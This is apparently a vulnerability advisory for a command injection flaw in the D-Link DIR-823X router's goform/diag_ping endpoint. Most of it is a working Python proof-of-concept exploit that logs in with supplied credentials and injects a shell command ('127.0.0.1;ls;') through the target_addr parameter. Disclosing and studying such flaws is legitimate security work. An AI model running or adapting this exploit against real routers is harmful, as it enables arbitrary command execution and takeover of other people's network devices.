
## Basic Information

Vulnerability Vendor: D-Link Corporation

Vulnerability level: High risk

Vendor Website: https://www.dlink.com.cn

Affected Object Type: Network Device

Affected Product: D-Link DIR-823X AX3000

Affected Product Versions: <=250416

Product Component Vulnerability: No
## 1. Vulnerability Overview

The D-Link DIR-823x is a wireless router product released by D-Link Corporation. The D-Link DIR-823x contains a command execution vulnerability. This vulnerability stems from the file /usr/sbin/goahead failing to adequately validate input parameters when processing environment variables. An attacker could exploit this vulnerability by constructing malicious requests to execute arbitrary commands on the system.

## 2. Details of the vulnerability

![029fa1896ba91c04155b8126e3492ae7.png](https://s2.loli.net/2025/09/03/ML89ndz4UmEQxwi.png)
At the `goform/diag_ping` location, the `target_addr` parameter lacks validation checks, introducing a logical error. Attackers can set malicious strings to perform injection attacks.

![daa534adb9b9dc5288b162fb17f6be01.png](https://s2.loli.net/2025/09/03/vkFbzilwURNCmLq.png)



## Poc
```python
import requests
import logging
import argparse
import re
import hmac
import hashlib


logging.basicConfig(level=logging.DEBUG)


def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)
    
    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def send_diag_traceroute_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/diag_ping"
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "target_addr": "127.0.0.1;ls;",
        "token": token
    }

    

    response = session.post(url, headers=headers, data=payload)
    
    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
        
        # Hash the password
        hashed_password = hash_password(args.password, token)
        
        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")
            
            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)
            
            # Send LAN settings request
            response = send_diag_traceroute_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```
